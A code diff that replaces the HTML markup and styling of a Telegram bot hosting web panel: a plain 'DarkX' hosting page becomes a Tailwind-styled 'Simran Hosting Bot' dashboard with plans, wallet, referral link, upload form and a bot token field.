@@ -1,2091 +1,1876 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DarkX Universal Bot Hosting Cloud — DB &amp; Uptime Edition</title>
-    <script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
-    <style>
-        :root {
-            --bg: #050811;
-            --panel: #0c1220;
-            --border: #1e293b;
-            --accent: #00f0ff;
-            --green: #00ff88;
-            --red: #ff3366;
-            --yellow: #ffaa00;
-            --text: #e2e8f0;
-            --muted: #94a3b8;
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ѕιмяαη нoѕтιηg ＲΒOT v2.1 — Cloud Bot Hosting Panel</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            slate: {
+              850: '#131c31',
+              900: '#0f172a',
+              950: '#070b14',
+            }
+          }
         }
+      }
+    };
+  </script>
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Consolas', 'Courier New', monospace;
-        }
-
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            padding: 12px;
-            min-height: 100vh;
-        }
-
-        .header {
-            max-width: 1380px;
-            margin: 0 auto 12px auto;
-            background: var(--panel);
-            border: 1px solid var(--border);
-            border-left: 4px solid var(--accent);
-            border-radius: 8px;
-            padding: 14px 18px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .header h1 {
-            font-size: 17px;
-            color: var(--accent);
-        }
-
-        .badges-wrap {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .status-badge {
-            padding: 5px 12px;
-            border-radius: 5px;
-            font-size: 11.5px;
-            font-weight: bold;
-            background: rgba(255, 51, 102, 0.15);
-            color: var(--red);
-            border: 1px solid var(--red);
-        }
-
-        .status-badge.online {
-            background: rgba(0, 255, 136, 0.15);
-            color: var(--green);
-            border-color: var(--green);
-        }
-
-        .status-badge.ready {
-            background: rgba(0, 240, 255, 0.12);
-            color: var(--accent);
-            border-color: var(--accent);
-        }
-
-        .uptime-grid {
-            max-width: 1380px;
-            margin: 0 auto 14px auto;
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-        }
-
-        @media (max-width: 950px) {
-            .uptime-grid { grid-template-columns: repeat(2, 1fr); }
-        }
-
-        @media (max-width: 520px) {
-            .uptime-grid { grid-template-columns: 1fr; }
-        }
-
-        .stat-card {
-            background: var(--panel);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 14px;
-        }
-
-        .stat-card.run-card { border-top: 3px solid var(--green); }
-        .stat-card.off-card { border-top: 3px solid var(--red); }
-        .stat-card.ses-card { border-top: 3px solid var(--accent); }
-        .stat-card.db-card  { border-top: 3px solid var(--yellow); }
-
-        .stat-label {
-            font-size: 11px;
-            color: var(--muted);
-            text-transform: uppercase;
-            margin-bottom: 5px;
-        }
-
-        .stat-val {
-            font-size: 14.5px;
-            font-weight: bold;
-            color: #fff;
-        }
-
-        .stat-sub {
-            font-size: 11px;
-            color: var(--muted);
-            margin-top: 4px;
-        }
-
-        .main-grid {
-            max-width: 1380px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 370px 1fr;
-            gap: 14px;
-        }
-
-        @media (max-width: 880px) {
-            .main-grid { grid-template-columns: 1fr; }
-        }
-
-        .card {
-            background: var(--panel);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 14px;
-            display: flex;
-            flex-direction: column;
-            gap: 11px;
-        }
-
-        .card-title {
-            font-size: 13px;
-            color: var(--accent);
-            text-transform: uppercase;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        label {
-            font-size: 11.5px;
-            color: var(--muted);
-            display: block;
-            margin-bottom: 4px;
-        }
-
-        input[type="text"], input[type="password"], input[type="file"], select, textarea {
-            width: 100%;
-            background: #060a12;
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 8px 10px;
-            border-radius: 6px;
-            font-size: 12.5px;
-            outline: none;
-        }
-
-        input:focus, select:focus, textarea:focus {
-            border-color: var(--accent);
-        }
-
-        .code-box {
-            min-height: 310px;
-            color: #00ff88;
-            line-height: 1.45;
-            resize: vertical;
-            white-space: pre;
-            overflow-x: auto;
-            tab-size: 4;
-        }
-
-        .req-box {
-            min-height: 78px;
-            color: #ffaa00;
-            line-height: 1.4;
-            resize: vertical;
-            font-size: 12px;
-        }
-
-        .btn-group {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            border: none;
-            padding: 10px 16px;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 12.5px;
-            transition: 0.15s;
-        }
-
-        .btn-start { background: var(--green); color: #000; flex: 1; }
-        .btn-stop { background: var(--red); color: #fff; flex: 1; display: none; }
-        .btn-small { background: #1e293b; color: var(--text); padding: 5px 10px; font-size: 11px; }
-
-        .file-list {
-            background: #060a12;
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            padding: 7px;
-            font-size: 11.5px;
-            max-height: 85px;
-            overflow-y: auto;
-        }
-
-        .file-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 3px 6px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            color: var(--green);
-        }
-
-        .console {
-            background: #030509;
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            padding: 12px;
-            height: 255px;
-            overflow-y: auto;
-            font-size: 12px;
-            line-height: 1.5;
-            white-space: pre-wrap;
-            word-break: break-word;
-            color: #cbd5e1;
-        }
-
-        .auto-resume-row {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(0, 255, 136, 0.07);
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            padding: 8px 10px;
-            border-radius: 6px;
-            font-size: 11.5px;
-            color: var(--green);
-        }
-    </style>
+  <style>
+    body {
+      background-color: #070b14;
+      color: #e2e8f0;
+      font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
+    }
+    /* Subtle cyber grid background */
+    .bg-grid {
+      background-size: 36px 36px;
+      background-image: 
+        linear-gradient(to right, rgba(99, 102, 241, 0.05) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(99, 102, 241, 0.05) 1px, transparent 1px);
+    }
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #0f172a;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #334155;
+      border-radius: 9999px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #6366f1;
+    }
+    /* Glowing accents */
+    .glow-indigo {
+      box-shadow: 0 0 25px -5px rgba(99, 102, 241, 0.35);
+    }
+    .glow-emerald {
+      box-shadow: 0 0 20px -5px rgba(16, 185, 129, 0.35);
+    }
+    .terminal-box {
+      background: #050811;
+      border: 1px solid #1e293b;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    @keyframes pulse-slow {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.45; }
+    }
+    .animate-pulse-slow {
+      animation: pulse-slow 2.2s infinite ease-in-out;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-8px); }
+      40%, 80% { transform: translateX(8px); }
+    }
+    .animate-shake {
+      animation: shake 0.4s ease-in-out;
+    }
+  </style>
 </head>
-<body>
+<body class="min-h-screen bg-grid flex flex-col selection:bg-indigo-500 selection:text-white">
 
-    <div class="header">
+  <!-- ===================== TOP ANNOUNCEMENT / STATUS BAR ===================== -->
+  <div class="bg-gradient-to-r from-indigo-950/90 via-slate-900 to-emerald-950/90 border-b border-slate-800/80 px-4 py-1.5 text-xs">
+    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2">
+      <div class="flex items-center gap-2">
+        <span class="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-medium">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
+          KEEPALIVE PORT: 10460
+        </span>
+        <span class="text-slate-400 hidden sm:inline">|</span>
+        <span class="text-slate-300 hidden sm:inline">
+          <i class="fa-solid fa-shield-halved text-indigo-400 mr-1"></i>
+          Fernet AES-128 Encrypted Sandbox + GitHub Keyring Vault Active
+        </span>
+      </div>
+      <div class="flex items-center gap-4 ml-auto">
+        <a href="https://t.me/+MXtA9ufCgok3Yjc1" target="_blank" rel="noopener" class="text-indigo-400 hover:text-indigo-300 transition flex items-center gap-1">
+          <i class="fa-brands fa-telegram"></i> Updates Channel
+        </a>
+        <span class="text-slate-400">Support: <strong class="text-slate-200">@nur7871</strong></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== MAIN HEADER / NAVBAR ===================== -->
+  <header class="sticky top-0 z-30 backdrop-blur-xl bg-slate-950/85 border-b border-slate-800/80">
+    <div class="max-w-7xl mx-auto px-4 py-3 flex flex-wrap items-center justify-between gap-4">
+      <!-- Brand Logo -->
+      <div class="flex items-center gap-3 cursor-pointer" onclick="switchTab('dashboard')">
+        <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-indigo-600 via-indigo-500 to-purple-600 flex items-center justify-center shadow-lg glow-indigo border border-indigo-400/30">
+          <i class="fa-solid fa-robot text-white text-xl"></i>
+        </div>
         <div>
-            <h1>⚡ DARKX UNIVERSAL BOT HOSTING ENGINE (DB + AUTO-RESUME)</h1>
-            <div style="font-size: 11.5px; color: var(--muted); margin-top: 3px;">Full File Decryption (`get_file` / `download_file`) • Paste Requirements • Device DB • By Ashif</div>
+          <div class="flex items-center gap-2">
+            <h1 class="font-extrabold text-lg tracking-tight bg-gradient-to-r from-white via-indigo-200 to-indigo-400 bg-clip-text text-transparent">
+              ѕιмяαη нoѕтιηg ＲΒOT
+            </h1>
+            <span class="text-[11px] font-mono font-semibold px-2 py-0.5 rounded-md bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
+              v2.1
+            </span>
+          </div>
+          <p class="text-xs text-slate-400">Python &amp; Node.js Cloud Bot Hosting Panel</p>
         </div>
-        <div class="badges-wrap">
-            <div class="status-badge ready" id="engineBadge">⏳ Loading Python Engine...</div>
-            <div class="status-badge" id="statusBadge">● BOT STOPPED</div>
+      </div>
+
+      <!-- User Status Pills -->
+      <div class="flex flex-wrap items-center gap-2.5">
+        <!-- Slots Pill -->
+        <div class="px-3 py-1.5 rounded-xl bg-slate-900/90 border border-slate-800 flex items-center gap-2 text-xs">
+          <i class="fa-solid fa-cubes text-cyan-400"></i>
+          <span class="text-slate-400">Slots:</span>
+          <span id="navSlotsText" class="font-mono font-bold text-white">3 / 8</span>
         </div>
+
+        <!-- Wallet Pill -->
+        <div onclick="openTopupModal()" class="cursor-pointer px-3 py-1.5 rounded-xl bg-slate-900/90 hover:bg-slate-800/90 border border-slate-800 flex items-center gap-2 text-xs transition">
+          <i class="fa-solid fa-wallet text-emerald-400"></i>
+          <span class="text-slate-400">Wallet:</span>
+          <span class="font-mono font-bold text-emerald-400"><span id="navWalletBalance">450</span> ৳</span>
+          <i class="fa-solid fa-circle-plus text-emerald-400 text-[11px] ml-0.5"></i>
+        </div>
+
+        <!-- Instant Plan Switcher Pill -->
+        <div class="px-2.5 py-1 rounded-xl bg-gradient-to-r from-amber-500/15 to-orange-500/15 border border-amber-500/30 flex items-center gap-2 text-xs">
+          <i class="fa-solid fa-crown text-amber-400"></i>
+          <span class="text-amber-200/80 hidden sm:inline">Plan:</span>
+          <select id="navPlanSelect" onchange="selectPlanDirect(this.value)" class="bg-transparent font-bold text-amber-300 tracking-wide uppercase focus:outline-none cursor-pointer pr-1">
+            <option value="free" class="bg-slate-900 text-slate-200">FREE (2 Bots)</option>
+            <option value="starter" class="bg-slate-900 text-slate-200">STARTER (4 Bots)</option>
+            <option value="basic" class="bg-slate-900 text-slate-200">BASIC (6 Bots)</option>
+            <option value="pro" selected class="bg-slate-900 text-amber-300">PRO PLAN (8 Bots)</option>
+            <option value="enterprise" class="bg-slate-900 text-slate-200">ENTERPRISE (10 Bots)</option>
+            <option value="lifetime" class="bg-slate-900 text-emerald-300">LIFETIME (15 Bots)</option>
+          </select>
+        </div>
+
+        <!-- Quick Upload CTA -->
+        <button onclick="switchTab('upload')" class="px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs flex items-center gap-2 shadow-md transition">
+          <i class="fa-solid fa-cloud-arrow-up"></i>
+          <span>Deploy Bot</span>
+        </button>
+      </div>
     </div>
 
-    <!-- LIVE UPTIME & DOWNTIME TRACKER DASHBOARD -->
-    <div class="uptime-grid">
-        <div class="stat-card run-card">
-            <div class="stat-label">🟢 Kitna Din Bot Chala Hai (Total Uptime)</div>
-            <div class="stat-val" id="totalRunDisplay" style="color: var(--green);">0 Din, 0h 0m 0s</div>
-            <div class="stat-sub" id="firstHostedDisplay">First Hosted: Today</div>
-        </div>
-        <div class="stat-card off-card">
-            <div class="stat-label">🔴 Kitna Din Band Raha (Total Offline)</div>
-            <div class="stat-val" id="totalOffDisplay" style="color: var(--red);">0 Din, 0h 0m 0s</div>
-            <div class="stat-sub" id="lastSeenDisplay">Status: Waiting</div>
-        </div>
-        <div class="stat-card ses-card">
-            <div class="stat-label">⏱️ Current Live Session &amp; Events</div>
-            <div class="stat-val" id="currentSessionDisplay" style="color: var(--accent);">00:00:00</div>
-            <div class="stat-sub">Processed Messages: <b id="msgCountLabel" style="color:#fff;">0</b></div>
-        </div>
-        <div class="stat-card db-card">
-            <div class="stat-label">💾 Device Database &amp; Auto-Resume</div>
-            <div class="stat-val" id="dbStateDisplay" style="color: var(--yellow);">● Auto-Saved in Device</div>
-            <div class="stat-sub" id="botUserLabel">Bot: Not Connected</div>
-        </div>
+    <!-- Navigation Tabs -->
+    <div class="max-w-7xl mx-auto px-4 flex items-center gap-1 overflow-x-auto border-t border-slate-900/80 pt-1">
+      <button onclick="switchTab('dashboard')" id="tabBtn-dashboard" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
+        <i class="fa-solid fa-chart-pie"></i> Dashboard
+      </button>
+      <button onclick="switchTab('upload')" id="tabBtn-upload" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
+        <i class="fa-solid fa-upload"></i> Upload &amp; Deploy
+      </button>
+      <button onclick="switchTab('bots')" id="tabBtn-bots" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
+        <i class="fa-solid fa-server"></i> My Bots
+        <span id="tabBotsCount" class="px-1.5 py-0.2 text-[11px] rounded-full bg-indigo-500/20 text-indigo-300 font-mono">3</span>
+      </button>
+      <button onclick="switchTab('scanner')" id="tabBtn-scanner" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
+        <i class="fa-solid fa-shield-virus"></i> AI Security Scanner
+      </button>
+      <button onclick="switchTab('plans')" id="tabBtn-plans" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
+        <i class="fa-solid fa-gem"></i> Plans &amp; Billing
+      </button>
+      <button onclick="switchTab('admin')" id="tabBtn-admin" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
+        <i id="adminNavLockIcon" class="fa-solid fa-lock text-rose-400"></i> Admin Panel
+        <span id="pendingBadgeNav" class="px-1.5 py-0.2 text-[11px] rounded-full bg-rose-500/20 text-rose-300 font-mono">2</span>
+      </button>
     </div>
+  </header>
 
-    <div class="main-grid">
-        <!-- Left Setup Panel -->
-        <div class="card">
-            <div class="card-title">1. Bot Setup, Requirements &amp; DB</div>
+  <!-- ===================== MAIN CONTENT AREA ===================== -->
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 py-6 space-y-6">
 
-            <div class="auto-resume-row">
-                <input type="checkbox" id="autoResumeToggle" checked onchange="saveAllToDeviceDB()">
-                <span><b>Auto-Start Bot on Page Load</b> (Refresh karne par khud chalega)</span>
+    <!-- ===================================================================== -->
+    <!-- TAB 1: DASHBOARD OVERVIEW                                             -->
+    <!-- ===================================================================== -->
+    <section id="tab-dashboard" class="tab-section space-y-6">
+      <!-- Hero Welcome Banner -->
+      <div class="relative rounded-2xl overflow-hidden bg-gradient-to-r from-slate-900 via-indigo-950/80 to-slate-900 border border-indigo-500/20 p-6 sm:p-8 shadow-xl">
+        <div class="relative z-10 flex flex-col lg:flex-row lg:items-center justify-between gap-6">
+          <div class="space-y-2 max-w-2xl">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-500/15 border border-indigo-500/30 text-indigo-300 text-xs font-medium">
+              <i class="fa-solid fa-bolt text-amber-400"></i>
+              <span>Telegram Bot API 9.4 Ready • Auto-Dependency Installer</span>
             </div>
+            <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">
+              Deploy Python &amp; Node.js Bots in Seconds
+            </h2>
+            <p class="text-sm text-slate-300 leading-relaxed">
+              Every uploaded file is scanned by our <strong>3-Layer Security Engine (Static Regex + Python AST + Gemma-4 AI)</strong>, encrypted with a unique <strong>Fernet AES-128 key</strong> stored in our GitHub Keyring, and executed in an isolated sandbox with secret-stripped environment variables.
+            </p>
+          </div>
+          <div class="flex flex-wrap sm:flex-nowrap gap-3">
+            <button onclick="switchTab('upload')" class="w-full sm:w-auto px-5 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm flex items-center justify-center gap-2 shadow-lg glow-indigo transition">
+              <i class="fa-solid fa-rocket"></i> Upload New Bot
+            </button>
+            <button onclick="switchTab('bots')" class="w-full sm:w-auto px-5 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold text-sm flex items-center justify-center gap-2 border border-slate-700 transition">
+              <i class="fa-solid fa-terminal"></i> Manage Bots
+            </button>
+          </div>
+        </div>
+      </div>
 
-            <div>
-                <label>Select Bot Language / Runtime:</label>
-                <select id="langSelect" onchange="switchLanguageTemplate()">
-                    <option value="python">🐍 Python (.py — Telebot / Pyrogram / Asyncio)</option>
-                    <option value="javascript">🟨 JavaScript / Node.js (.js — TelegramBot / Telegraf)</option>
-                    <option value="php">🐘 PHP (.php — Telegram Bot Script)</option>
-                    <option value="json">⚡ JSON Auto-Reply Bot (.json)</option>
-                </select>
+      <!-- Live Telemetry Cards -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+        <!-- Card 1: Running Bots -->
+        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
+          <div>
+            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Running Bots</p>
+            <p class="text-2xl font-extrabold text-white mt-1 font-mono" id="statRunningBots">2 / 3</p>
+            <p id="statAutoRestartBadge" class="text-xs text-emerald-400 mt-1 flex items-center gap-1">
+              <i class="fa-solid fa-arrows-rotate"></i> Auto-Restart Enabled
+            </p>
+          </div>
+          <div class="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 text-xl">
+            <i class="fa-solid fa-play"></i>
+          </div>
+        </div>
+
+        <!-- Card 2: Sandbox RAM Usage -->
+        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
+          <div>
+            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">RAM Allocation</p>
+            <p class="text-2xl font-extrabold text-white mt-1 font-mono"><span id="statRamUsed">184.6</span> <span class="text-sm font-normal text-slate-400">/ <span id="statRamLimit">2048</span> MB</span></p>
+            <div class="w-36 h-1.5 bg-slate-800 rounded-full overflow-hidden mt-2">
+              <div id="statRamBar" class="h-full bg-indigo-500 rounded-full" style="width: 14%"></div>
             </div>
+          </div>
+          <div class="w-12 h-12 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 text-xl">
+            <i class="fa-solid fa-memory"></i>
+          </div>
+        </div>
 
+        <!-- Card 3: CPU Telemetry -->
+        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
+          <div>
+            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Sandbox CPU Load</p>
+            <p class="text-2xl font-extrabold text-white mt-1 font-mono"><span id="statCpuLoad">6.4</span>%</p>
+            <p class="text-xs text-cyan-400 mt-1">8 Worker Threads Active</p>
+          </div>
+          <div class="w-12 h-12 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 text-xl">
+            <i class="fa-solid fa-microchip"></i>
+          </div>
+        </div>
+
+        <!-- Card 4: Panel Uptime -->
+        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
+          <div>
+            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Panel Uptime</p>
+            <p class="text-2xl font-extrabold text-white mt-1 font-mono" id="statUptime">14d 06h 42m</p>
+            <p class="text-xs text-amber-400 mt-1 flex items-center gap-1">
+              <i class="fa-brands fa-github"></i> GitHub Synced
+            </p>
+          </div>
+          <div class="w-12 h-12 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 text-xl">
+            <i class="fa-solid fa-clock-rotate-left"></i>
+          </div>
+        </div>
+      </div>
+
+      <!-- Two-Column Grid: Active Bots Quick View + Account & Referral Card -->
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Left 2 Cols: Quick Bot Status Table -->
+        <div class="lg:col-span-2 rounded-2xl bg-slate-900/90 border border-slate-800 p-5 flex flex-col justify-between space-y-4">
+          <div class="flex items-center justify-between">
             <div>
-                <label>Telegram Bot Token (Auto-saved in Device DB):</label>
-                <input type="text" id="tokenInput" placeholder="8726308481:AAE2hg5ag4Dar4PLmj..." oninput="saveAllToDeviceDB()">
+              <h3 class="font-bold text-base text-white flex items-center gap-2">
+                <i class="fa-solid fa-layer-group text-indigo-400"></i>
+                Active Sandbox Processes
+              </h3>
+              <p class="text-xs text-slate-400">Real-time subprocess pool with automatic source-file wiping after boot</p>
             </div>
+            <button onclick="switchTab('bots')" class="text-xs text-indigo-400 hover:text-indigo-300 font-semibold">
+              Open Full Manager <i class="fa-solid fa-arrow-right ml-1"></i>
+            </button>
+          </div>
 
-            <div>
-                <label>Upload Bot Code File (.py, .js, .php, .json):</label>
-                <input type="file" id="codeFileUpload" accept=".py,.js,.php,.json,.txt" onchange="handleCodeUpload(this)">
+          <div id="dashboardBotsPreview" class="space-y-2.5">
+            <!-- Dynamically populated by JS -->
+          </div>
+        </div>
+
+        <!-- Right 1 Col: Referral & Free Trial Box -->
+        <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-5 space-y-4 flex flex-col justify-between">
+          <div class="space-y-3">
+            <div class="flex items-center justify-between">
+              <h3 class="font-bold text-base text-white flex items-center gap-2">
+                <i class="fa-solid fa-gift text-pink-400"></i>
+                Invite &amp; Earn Slots
+              </h3>
+              <span class="text-xs px-2 py-0.5 rounded-md bg-pink-500/15 text-pink-300 border border-pink-500/30">+1 Slot / Refer</span>
             </div>
-
-            <div>
-                <label>📦 Paste Requirements (`requirements.txt`):</label>
-                <textarea class="req-box" id="reqEditor" spellcheck="false" placeholder="pyTelegramBotAPI&#10;requests&#10;pycryptodome&#10;aiohttp" oninput="saveAllToDeviceDB()">pyTelegramBotAPI
-requests</textarea>
+            <p class="text-xs text-slate-400 leading-relaxed">
+              Share your referral link with friends. Every user who joins gives you <strong>+1 Bot Slot</strong> and <strong>+1 ৳ Wallet Credit</strong> automatically!
+            </p>
+            <div class="p-2.5 rounded-xl bg-slate-950 border border-slate-800 flex items-center justify-between gap-2">
+              <code id="refLinkInput" class="text-xs text-indigo-300 font-mono truncate">https://t.me/SimranHostingBot?start=8253072984</code>
+              <button onclick="copyRefLink()" class="px-2.5 py-1 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-medium shrink-0 transition">
+                <i class="fa-regular fa-copy mr-1"></i> Copy
+              </button>
             </div>
+          </div>
 
-            <div>
-                <label>Upload Extra Data / `requirements.txt` Files:</label>
-                <input type="file" id="dataFileUpload" multiple onchange="handleDataUpload(this)">
+          <!-- Coupon & Trial Box -->
+          <div class="pt-3 border-t border-slate-800 space-y-2.5">
+            <div class="flex items-center justify-between text-xs">
+              <span class="text-slate-400">One-Time 48h Pro Trial:</span>
+              <button id="claimTrialBtn" onclick="claimFreeTrial()" class="px-2.5 py-1 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/30 font-semibold transition">
+                <i class="fa-solid fa-wand-magic-sparkles mr-1"></i> Claim 48h Trial
+              </button>
             </div>
+            <div class="flex gap-2">
+              <input id="quickCouponInput" type="text" placeholder="Enter coupon (e.g. SIMRAN50)" class="w-full px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono focus:outline-none focus:border-indigo-500" />
+              <button onclick="redeemCoupon()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white shrink-0 border border-slate-700 transition">
+                Redeem
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
 
+    <!-- ===================================================================== -->
+    <!-- TAB 2: UPLOAD & DEPLOY BOT                                            -->
+    <!-- ===================================================================== -->
+    <section id="tab-upload" class="tab-section hidden space-y-6">
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Left 2 Cols: Upload Dropzone & Configuration -->
+        <div class="lg:col-span-2 rounded-2xl bg-slate-900/90 border border-slate-800 p-6 space-y-5">
+          <div class="flex flex-wrap items-center justify-between gap-2">
             <div>
-                <label>Workspace Files Saved in Device DB:</label>
-                <div class="file-list" id="fileListBox">
-                    <div class="file-item"><span>📄 main.py</span><span>Saved in DB</span></div>
+              <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                <i class="fa-solid fa-cloud-arrow-up text-indigo-400"></i>
+                Upload &amp; Deploy Bot Package
+              </h2>
+              <p class="text-xs text-slate-400">Supports single <code>.py</code>, <code>.js</code> files or full project <code>.zip</code> archives (up to 75 MB)</p>
+            </div>
+            <span class="px-2.5 py-1 rounded-lg bg-indigo-500/10 border border-indigo-500/30 text-indigo-300 text-xs font-mono">
+              <i class="fa-solid fa-lock mr-1"></i> Fernet AES-128
+            </span>
+          </div>
+
+          <!-- Drag & Drop Zone -->
+          <div id="dropZone" onclick="document.getElementById('botFileInput').click()" class="border-2 border-dashed border-slate-700 hover:border-indigo-500 rounded-2xl p-8 text-center cursor-pointer transition bg-slate-950/50 hover:bg-indigo-950/15 group">
+            <input type="file" id="botFileInput" accept=".py,.js,.zip" class="hidden" onchange="handleFileSelect(event)" />
+            <div class="w-16 h-16 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mx-auto text-indigo-400 text-2xl group-hover:scale-110 transition">
+              <i class="fa-solid fa-file-code"></i>
+            </div>
+            <p class="text-sm font-semibold text-white mt-4" id="selectedFileName">
+              Click to browse or drag &amp; drop your bot file here
+            </p>
+            <p class="text-xs text-slate-400 mt-1" id="selectedFileMeta">
+              Auto-detects entry point: <code>bot.py</code>, <code>main.py</code>, <code>app.py</code>, <code>index.js</code>, <code>bot.js</code>
+            </p>
+          </div>
+
+          <!-- Bot Details Form -->
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div>
+              <label class="block text-xs font-semibold text-slate-300 mb-1.5">Bot Name</label>
+              <input id="uploadBotName" type="text" placeholder="e.g., music_helper_bot" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-sm text-white font-mono focus:outline-none focus:border-indigo-500" />
+            </div>
+            <div>
+              <label class="block text-xs font-semibold text-slate-300 mb-1.5">Runtime / Entry Point</label>
+              <select id="uploadRuntime" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-sm text-white focus:outline-none focus:border-indigo-500">
+                <option value="python">Python 3.11 (bot.py / main.py)</option>
+                <option value="node">Node.js 20 LTS (index.js / bot.js)</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Optional BOT_TOKEN Env Variable -->
+          <div>
+            <label class="block text-xs font-semibold text-slate-300 mb-1.5">
+              Telegram <code>BOT_TOKEN</code> (Injected into isolated Sandbox Environment)
+            </label>
